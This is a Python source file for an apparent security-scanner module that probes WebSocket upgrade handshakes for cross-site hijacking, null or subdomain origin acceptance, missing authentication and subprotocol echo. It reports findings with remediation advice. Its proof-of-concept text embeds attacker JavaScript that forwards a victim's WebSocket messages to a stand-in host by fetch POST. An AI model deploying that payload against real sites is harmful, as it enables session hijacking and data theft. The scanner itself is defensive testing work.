"""`scan_websocket_auth` — WebSocket / SSE authentication probe.

Closes masterroadmap §1.5 P1 (web_application coverage). Modern
apps almost universally have WebSocket and SSE endpoints
(real-time updates, chat, live cursors). The auth model on the
**Upgrade handshake** is consistently the weakest link:

  * **Cross-Site WebSocket Hijacking (CSWSH)** — server doesn't
    validate the `Origin` header on Upgrade, so any
    attacker-hosted page can open a WebSocket to the victim's
    domain in the victim's authenticated browser. The cookie
    rides automatically; the attacker pipes messages.
  * **Missing auth on Upgrade** — the WebSocket handshake is
    accepted without any auth token. Combined with weak
    message-level authz, full RPC exposure.
  * **`Origin: null` accepted** — sandboxed iframes / `data:`
    URLs send `Origin: null`. Servers that accept it from null
    accept it from anywhere.
  * **No subprotocol allowlist** — server echoes whatever the
    client requested, leaking internal protocol semantics.

This specialist sends raw HTTP/1.1 WebSocket Upgrade handshakes
(no actual ws library required) and inspects the response status
to determine handshake acceptance. The `101 Switching Protocols`
status is the universal yes; anything else is no.

## Probes

| Probe | Mutation | Severity if accepted |
|---|---|---|
| `cross_origin_attacker` | `Origin: https://attacker.example` | critical (CSWSH) |
| `null_origin` | `Origin: null` | high |
| `subdomain_origin` | `Origin: https://evil.<target>` | high (subdomain trust) |
| `anonymous_upgrade` | no auth cookies / headers | high (missing-auth) |
| `wildcard_subprotocol` | `Sec-WebSocket-Protocol: x.y.z.evil` | medium |
| `wss_to_ws_downgrade` | offer `ws://` even when served via TLS | medium |

The cross-origin probe is the headline finding — it's the only
one that proves an attacker page can hijack the victim's session.

## What this does NOT do

  * **Per-message authz testing** — once the handshake is
    accepted, this probe doesn't fuzz application-level messages.
    That's the agent's MOAK follow-up.
  * **Server-Sent Events (`text/event-stream`)** — handshake
    semantics differ (it's a long-lived GET with `Accept:
    text/event-stream`). SSE coverage is a separate sibling probe.
  * **WebSocket fuzzing / message smuggling** — out of scope for
    the auth-layer probe.

Findings emit as `category=websocket_auth`, CWE-346 (Origin
Validation Error) for cross-origin / null-origin, CWE-306
(Missing Authentication for Critical Function) for anonymous
upgrade.
"""

from __future__ import annotations

import base64
import logging
import os
import secrets
import socket
import ssl
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# Per-handshake socket timeout. WebSocket upgrade is fast (just
# a response status); 8s is plenty.
_DEFAULT_TIMEOUT = 8.0

# Cap on raw response bytes read after handshake. We only need
# the status line + headers; capping prevents the test from
# blocking on a real WebSocket frame stream.
_MAX_RESPONSE_BYTES = 4096


# ---------------------------------------------------------------------------
# Handshake construction
# ---------------------------------------------------------------------------


def _generate_websocket_key() -> str:
    """RFC 6455 §4.1 — 16 random bytes, base64-encoded."""
    return base64.b64encode(secrets.token_bytes(16)).decode("ascii")


def _build_handshake(
    *,
    host: str,
    path: str,
    origin: str | None = None,
    cookie: str | None = None,
    authorization: str | None = None,
    extra_headers: dict[str, str] | None = None,
    subprotocols: list[str] | None = None,
) -> bytes:
    """Build a raw HTTP/1.1 WebSocket Upgrade handshake."""
    key = _generate_websocket_key()
    lines = [
        f"GET {path or '/'} HTTP/1.1",
        f"Host: {host}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
    ]
    if origin is not None:
        lines.append(f"Origin: {origin}")
    if cookie:
        lines.append(f"Cookie: {cookie}")
    if authorization:
        lines.append(f"Authorization: {authorization}")
    if subprotocols:
        lines.append(
            f"Sec-WebSocket-Protocol: {', '.join(subprotocols)}"
        )
    for k, v in (extra_headers or {}).items():
        lines.append(f"{k}: {v}")
    raw = "\r\n".join(lines) + "\r\n\r\n"
    return raw.encode("ascii", errors="replace")


# ---------------------------------------------------------------------------
# Raw-socket send (parallels scan_request_smuggling_active)
# ---------------------------------------------------------------------------


def _send_handshake(
    host: str, port: int, *, use_tls: bool,
    raw_request: bytes, timeout: float = _DEFAULT_TIMEOUT,
) -> tuple[int | None, dict[str, str], str | None]:
    """Send a raw Upgrade handshake.

    Returns `(status_code, response_headers, error)`.

    `status_code` is the HTTP status line code (101 = upgraded,
    400/401/403/426 = rejected, etc.). None on socket error.
    `response_headers` is lowercase-keyed for stable lookups.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))
        sock.sendall(raw_request)
        chunks: list[bytes] = []
        bytes_read = 0
        while bytes_read < _MAX_RESPONSE_BYTES:
            try:
                buf = sock.recv(4096)
            except (socket.timeout, TimeoutError):
                break
            if not buf:
                break
            chunks.append(buf)
            bytes_read += len(buf)
            # We have status line + headers once we see `\r\n\r\n`.
            if b"\r\n\r\n" in b"".join(chunks):
                break

        raw = b"".join(chunks).decode("iso-8859-1", errors="replace")
        # Parse status line + headers.
        if not raw:
            return None, {}, "empty response"
        header_block, _, _ = raw.partition("\r\n\r\n")
        status_line, _, header_lines = header_block.partition("\r\n")
        # `HTTP/1.1 101 Switching Protocols` → 101
        parts = status_line.split()
        status_code: int | None = None
        if len(parts) >= 2:
            try:
                status_code = int(parts[1])
            except ValueError:
                status_code = None
        # Parse headers.
        headers: dict[str, str] = {}
        for line in header_lines.split("\r\n"):
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()
        return status_code, headers, None
    except (socket.error, OSError, ssl.SSLError) as e:
        return None, {}, f"{type(e).__name__}: {e}"
    finally:
        try:
            sock.close()
        except Exception:  # noqa: BLE001
            pass


def _is_handshake_accepted(
    status: int | None, headers: dict[str, str],
) -> bool:
    """`101 Switching Protocols` + `Upgrade: websocket` confirms
    the handshake succeeded.

    Per RFC 6455, the server MUST respond 101 with `Upgrade:
    websocket`, `Connection: Upgrade`, and `Sec-WebSocket-Accept`
    when accepting. We check the status + Upgrade — partial
    acceptance (101 without the right Upgrade header) is rare
    enough to ignore."""
    if status != 101:
        return False
    upgrade = headers.get("upgrade", "").lower()
    return "websocket" in upgrade


# ---------------------------------------------------------------------------
# URL parsing
# ---------------------------------------------------------------------------


def _parse_target(url: str) -> tuple[str, int, bool, str, str] | None:
    """Return `(host, port, use_tls, path, origin_scheme_host)`.
    Returns None on parse failure.

    `origin_scheme_host` is the canonical origin string a
    legitimately-trusted browser would send (e.g.
    `https://app.example.com`)."""
    parsed = urlparse(url.strip())
    scheme = parsed.scheme.lower()
    if scheme in ("ws", "http"):
        use_tls = False
        default_port = 80
    elif scheme in ("wss", "https"):
        use_tls = True
        default_port = 443
    else:
        return None
    if not parsed.hostname:
        return None
    host = parsed.hostname
    port = parsed.port or default_port
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    origin_scheme = "https" if use_tls else "http"
    origin = f"{origin_scheme}://{host}"
    if (use_tls and port != 443) or (not use_tls and port != 80):
        origin = f"{origin}:{port}"
    return host, port, use_tls, path, origin


def _attacker_origin(target_host: str) -> str:
    """A safely-distinct attacker origin. Configurable via env
    for engagements that have a designated attacker domain."""
    return os.environ.get(
        "STRIX_ATTACKER_DOMAIN", "https://attacker.example",
    )


def _subdomain_origin(scheme: str, target_host: str) -> str:
    """`https://evil.<target>` — common subdomain-trust bypass."""
    return f"{scheme}://evil.{target_host}"


# ---------------------------------------------------------------------------
# Probe registry
# ---------------------------------------------------------------------------


# Each entry: (label, severity, cwe, description, builder_kwargs)
# where builder_kwargs is the dict passed to `_build_handshake`
# (with `host`, `path` injected at dispatch time).
_PROBES: tuple[tuple[str, str, str, str, dict[str, Any]], ...] = (
    (
        "cross_origin_attacker",
        "critical",
        "CWE-346",
        "Cross-origin handshake from attacker domain accepted "
        "(Cross-Site WebSocket Hijacking — CSWSH)",
        {"origin_kind": "attacker"},
    ),
    (
        "null_origin",
        "high",
        "CWE-346",
        "`Origin: null` accepted — sandboxed iframes / `data:` "
        "URLs can hijack the WebSocket",
        {"origin_kind": "null"},
    ),
    (
        "subdomain_origin",
        "high",
        "CWE-346",
        "Cross-subdomain handshake accepted — XSS on any "
        "subdomain pivots to WebSocket hijacking",
        {"origin_kind": "subdomain"},
    ),
    (
        "anonymous_upgrade",
        "high",
        "CWE-306",
        "Handshake accepted with no auth cookies / Authorization "
        "header — missing auth at the Upgrade boundary",
        {"origin_kind": "none", "strip_auth": True},
    ),
    (
        "wildcard_subprotocol",
        "medium",
        "CWE-693",
        "Server echoes an arbitrary subprotocol back — no "
        "allowlist enforcement",
        {"origin_kind": "legitimate", "subprotocols":
         ["x-strix-fictional-protocol-v1"]},
    ),
)


# ---------------------------------------------------------------------------
# Origin builder
# ---------------------------------------------------------------------------


def _origin_for_probe(
    origin_kind: str, *,
    use_tls: bool, target_host: str,
) -> str | None:
    scheme = "https" if use_tls else "http"
    if origin_kind == "attacker":
        return _attacker_origin(target_host)
    if origin_kind == "null":
        return "null"
    if origin_kind == "subdomain":
        return _subdomain_origin(scheme, target_host)
    if origin_kind == "legitimate":
        return f"{scheme}://{target_host}"
    if origin_kind == "none":
        return None
    return None


# ---------------------------------------------------------------------------
# Auth header extraction (so anonymous_upgrade can strip them)
# ---------------------------------------------------------------------------


def _resolve_auth_headers() -> tuple[str | None, str | None]:
    """Return `(cookie, authorization)` from the configured auth
    envs (mirrors `inject_auth_headers` minus the proxy wrapper)."""
    cookie = os.environ.get("STRIX_AUTH_COOKIE") or None
    bearer = os.environ.get("STRIX_AUTH_BEARER") or None
    basic = os.environ.get("STRIX_AUTH_BASIC") or None
    authorization: str | None = None
    if bearer:
        authorization = f"Bearer {bearer}"
    elif basic:
        if ":" in basic:
            authorization = f"Basic {base64.b64encode(basic.encode()).decode()}"
    return cookie, authorization


# ---------------------------------------------------------------------------
# Finding emission
# ---------------------------------------------------------------------------


def _emit_finding(
    *,
    url: str,
    probe_label: str,
    severity: str,
    cwe: str,
    description: str,
    origin_used: str | None,
    response_status: int,
    response_headers: dict[str, str],
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer
        tracer = get_global_tracer()
        if tracer is None:
            return None

        impact_blocks: list[str] = []
        if "cross_origin" in probe_label or probe_label == "null_origin" \
                or probe_label == "subdomain_origin":
            impact_blocks.append(
                "Cross-Site WebSocket Hijacking. An attacker page can "
                "open a WebSocket connection to the target in the "
                "victim's authenticated browser. The session cookie "
                "rides automatically. The attacker now controls a "
                "live RPC channel to the application as the victim: "
                "exfiltrate messages, send privileged actions, hijack "
                "real-time features."
            )
        if probe_label == "anonymous_upgrade":
            impact_blocks.append(
                "Missing authentication at the Upgrade boundary. "
                "ANY caller can open the WebSocket without credentials. "
                "If the server then trusts the connection for "
                "privileged messages, this is full unauthenticated RPC "
                "exposure."
            )
        if probe_label == "wildcard_subprotocol":
            impact_blocks.append(
                "Subprotocol allowlist not enforced. Less critical "
                "directly, but indicates the application accepts "
                "arbitrary protocol negotiations — useful for the "
                "agent to fingerprint internal protocols and pivot."
            )

        finding_id = tracer.add_vulnerability_report(
            title=(
                f"WebSocket auth probe `{probe_label}` succeeded "
                f"at {url}"
            ),
            severity=severity,
            cwe=cwe,
            endpoint=url,
            target=url,
            category="websocket_auth",
            verification_status="verified",
            confidence=0.95,
            description=(
                f"{description}.\n\n"
                f"Server responded with `{response_status} "
                f"Switching Protocols` to a WebSocket Upgrade request "
                f"using origin `{origin_used or '(none)'}`. "
                f"`Upgrade: websocket` echoed in the response — "
                f"handshake successfully accepted."
            ),
            impact="\n\n".join(impact_blocks)
            or "Authentication / origin policy violated at the "
            "WebSocket Upgrade boundary.",
            technical_analysis=(
                f"URL: {url}\n"
                f"Probe: {probe_label}\n"
                f"Origin used: {origin_used or '(none)'}\n"
                f"Response status: {response_status}\n"
                f"Response Upgrade header: "
                f"{response_headers.get('upgrade', '(none)')}\n"
                f"Response Sec-WebSocket-Accept: "
                f"{response_headers.get('sec-websocket-accept', '(none)')}\n"
                f"Response Sec-WebSocket-Protocol: "
                f"{response_headers.get('sec-websocket-protocol', '(none)')}"
            ),
            poc_description=(
                "PoC for CSWSH:\n"
                "  1. Host the following page on an attacker domain:\n"
                "     ```html\n"
                "     <script>\n"
                f"       const ws = new WebSocket('{url.replace('http', 'ws')}');\n"
                "       ws.onopen = () => ws.send('STEAL_DATA');\n"
                "       ws.onmessage = e => fetch("
                "'https://attacker/c', "
                "{method:'POST', body: e.data});\n"
                "     </script>\n"
                "     ```\n"
                "  2. Trick the authenticated victim into visiting "
                "the attacker page (any drive-by).\n"
                "  3. The browser opens the WebSocket with the "
                "victim's cookies; the attacker's JS pipes messages "
                "to their listener."
            ),
            remediation_steps=(
                "1. **Validate the `Origin` header** at the Upgrade "
                "handshake. Reject anything that isn't in your "
                "explicit allowlist of legitimate front-end origins. "
                "Treat `Origin: null` as rejection.\n"
                "2. **Require authentication on the Upgrade itself** "
                "— don't rely on cookies-only. Send a session token "
                "as a query param (`?token=...`) or a custom "
                "subprotocol that includes the token; validate it "
                "BEFORE switching protocols.\n"
                "3. **Use CSRF-token-equivalent on WebSocket**: "
                "embed a one-time token in the page that opens the "
                "connection; send it as the first message; reject "
                "the connection if the token is missing / invalid.\n"
                "4. **Subprotocol allowlist**: explicitly reject "
                "any subprotocol your server doesn't implement; "
                "don't blanket-echo back."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "R",
                "S": "C", "C": "H", "I": "H", "A": "L",
            },
            reasoning_trace=[
                f"Issued WebSocket Upgrade handshake to {url}.",
                f"Origin: `{origin_used or '(none)'}`.",
                f"Server responded {response_status} with "
                f"`Upgrade: {response_headers.get('upgrade', '(none)')}`.",
                "Handshake accepted (status 101 + Upgrade: websocket); "
                "origin / auth policy was not enforced.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url,
                param=probe_label, cwe=cwe, severity=severity,
                category="websocket_auth", method="GET",
                detection_kind=probe_label, confidence=0.95,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_websocket_auth: kg record failed: %s",
                         e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_websocket_auth: emit failed: %s",
                     e, exc_info=True)
        return None


# ---------------------------------------------------------------------------
# Public specialist
# ---------------------------------------------------------------------------


@register_specialist_tool(
    category="websocket-auth-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 120},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190", "T1185"],
)
def scan_websocket_auth(
    *,
    url: str,
    probes: list[str] | None = None,
    timeout_seconds: float = _DEFAULT_TIMEOUT,
) -> SpecialistResult:
    """Probe a WebSocket endpoint's Upgrade-handshake auth posture.

    Args:
        url: WebSocket endpoint URL (`ws://` / `wss://` /
            `http://` / `https://` accepted; `http(s)` is rewritten
            to `ws(s)` semantics for the handshake but the auth
            posture is what's measured).
        probes: optional allow-list of probe labels. None = all
            built-in probes.
        timeout_seconds: per-handshake socket timeout. Default 8s;
            handshake response should arrive in <1s for a healthy
            target.

    Findings emit as `category=websocket_auth` with the per-probe
    CWE (CWE-346 for origin issues, CWE-306 for missing auth,
    CWE-693 for subprotocol echo). Severity is the published
    per-probe value above; verified confidence 0.95.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    parsed = _parse_target(url)
    if parsed is None:
        return SpecialistResult(
            status="error",
            error=(f"unsupported / invalid URL scheme: {url} "
                   f"(need ws/wss/http/https)"),
        )
    host, port, use_tls, path, _legit_origin = parsed

    allowed = set(probes) if probes else None
    active = [p for p in _PROBES if allowed is None or p[0] in allowed]
    if not active:
        return SpecialistResult(
            status="error",
            error="no probes selected (check `probes` allow-list)",
        )

    # Baseline: legitimate-origin handshake. If THIS isn't accepted,
    # the target probably isn't a WebSocket endpoint at all — bail
    # out so we don't false-positive on 404s.
    baseline_origin = f"{'https' if use_tls else 'http'}://{host}"
    if (use_tls and port != 443) or (not use_tls and port != 80):
        baseline_origin += f":{port}"
    cookie, authorization = _resolve_auth_headers()
    baseline_handshake = _build_handshake(
        host=host, path=path, origin=baseline_origin,
        cookie=cookie, authorization=authorization,
    )
    base_status, base_headers, base_err = _send_handshake(
        host, port, use_tls=use_tls,
        raw_request=baseline_handshake, timeout=timeout_seconds,
    )
    if base_err is not None:
        return SpecialistResult(
            status="error",
            error=f"baseline handshake failed: {base_err}",
        )
    if not _is_handshake_accepted(base_status, base_headers):
        # Not a WebSocket endpoint, or it requires something we
        # don't have. Either way we shouldn't emit findings —
        # we can't distinguish "no WebSocket here" from
        # "rejects everyone strictly."
        return SpecialistResult(
            status="partial",
            error=(
                f"target did not accept legitimate WebSocket "
                f"handshake (status: {base_status}). Either it's "
                f"not a WebSocket endpoint, or it requires an "
                f"auth shape strix isn't configured with."
            ),
            evidence=[
                f"baseline-origin handshake: status={base_status} "
                f"upgrade={base_headers.get('upgrade', '(none)')}"
            ],
            tool_metadata={
                "target": url,
                "baseline_status": base_status,
                "probes_run": 0,
            },
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted = 0
    probes_run = 0

    for label, severity, cwe, description, kw in active:
        probes_run += 1
        origin_kind = kw.get("origin_kind", "legitimate")
        origin = _origin_for_probe(
            origin_kind, use_tls=use_tls, target_host=host,
        )
        strip_auth = kw.get("strip_auth", False)
        subprotocols = kw.get("subprotocols")
        handshake_cookie = None if strip_auth else cookie
        handshake_auth = None if strip_auth else authorization

        raw = _build_handshake(
            host=host, path=path, origin=origin,
            cookie=handshake_cookie,
            authorization=handshake_auth,
            subprotocols=subprotocols,
        )
        status, hdrs, err = _send_handshake(
            host, port, use_tls=use_tls,
            raw_request=raw, timeout=timeout_seconds,
        )
        if err is not None:
            continue
        if not _is_handshake_accepted(status, hdrs):
            continue

        # Probe-specific finding-firing rules.
        fire = True
        if label == "wildcard_subprotocol":
            # The echo signal: response Sec-WebSocket-Protocol
            # contains our injected name.
            echoed = (hdrs.get("sec-websocket-protocol") or "").lower()
            fire = "x-strix-fictional-protocol-v1" in echoed
        if not fire:
            continue

        rid = _emit_finding(
            url=url, probe_label=label, severity=severity,
            cwe=cwe, description=description, origin_used=origin,
            response_status=status, response_headers=hdrs,
        )
        if rid:
            emitted += 1
        drafts.append(FindingDraft(
            title=f"WebSocket auth: {label}",
            severity=severity, cwe=cwe,
            endpoint=url, category="websocket_auth",
            verification_status="verified", confidence=0.95,
            description=(
                f"{description}; handshake accepted (status "
                f"{status}) with origin `{origin or '(none)'}`"
            ),
        ))
        evidence.append(
            f"{label}: origin={origin or '(none)'} status={status}"
        )

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", probed_for="websocket_auth")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_websocket_auth"},
            input={"probes_run": probes_run, "baseline_status": base_status},
            output={"findings_emitted": emitted, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            [
                "Once the handshake is hijack-accessible, send "
                "application-level messages from an attacker page "
                "and observe authorisation enforcement. The "
                "Upgrade boundary being broken doesn't always mean "
                "message-level authz is broken — confirm.",
                "Document the legitimate Origin allow-list "
                "expected for this endpoint and check the wrapper "
                "renders the CSWSH PoC to dev clearly.",
            ]
            if drafts else
            [
                "Origin validation appears enforced at the Upgrade "
                "handshake. Pivot to message-level fuzzing once "
                "authenticated to look for authz gaps INSIDE the "
                "established WebSocket channel.",
            ]
        ),
        tool_metadata={
            "target": url,
            "baseline_status": base_status,
            "probes_run": probes_run,
            "findings_emitted_to_tracer": emitted,
        },
    )
